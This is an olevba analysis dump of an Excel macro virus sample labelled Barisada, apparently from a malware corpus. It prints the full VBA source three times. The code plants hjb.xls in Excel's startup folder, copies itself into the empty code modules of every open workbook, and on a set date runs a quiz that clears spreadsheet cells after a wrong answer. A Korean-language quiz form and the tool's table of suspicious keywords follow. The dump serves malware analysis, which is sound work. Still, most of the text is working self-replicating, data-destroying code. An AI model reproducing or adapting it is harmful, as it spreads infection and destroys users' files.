olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
UserForm1.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub




































-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub




































-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub




































-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30 - OLE stream: '_VBA_PROJECT_CUR/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim COUNTA As Integer
Private Sub CommandButton1_Click()
If OptionButton1.Value = True Then
                 MsgBox ("에이!. 아닌데 다시")
                 COUNTA = COUNTA + 1
                 TEXT
End If
                 
                 
If OptionButton2.Value = True Then
                 MsgBox ("초이스. 음 이것은 커피이름인데...")
                 COUNTA = COUNTA + 1
                 TEXT
End If

If OptionButton3.Value = True Then
                  MsgBox ("맥심.... 어디서 많이 듣던 이름인데 오호..커피")
                 COUNTA = COUNTA + 1
                 TEXT
End If
                  

If OptionButton4.Value = True Then
              MsgBox ("맞다고요. 정답이예요. 더이상 하지 않아도 될것같은데...." & Chr(13) & "SHEET2로 가세요")
              

End Sub

Sub TEXT()
Select Case COUNTA
  Case 1: MsgBox ("다시 한번 잘 찍어봐요... 첫번째이니...")
  Case 2: MsgBox ("찍기에 별루 소질이 없군요....두번째도 실패...")
  Case 3: MsgBox ("이룬.... 완전히 이제는 하나밖에 안남았는데...")

 End Select
 
                              

End Sub



Private Sub CommandButton2_Click()
UserForm1.Hide
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�x��� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�P�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǔ� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4���|�L���?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 SCALE@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CHOICE@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MAXIM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LARGE/SMALL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���X�0��
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSExcel.Barisada-d71a00f1f5943d6f478860db3e3d864229710a30' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
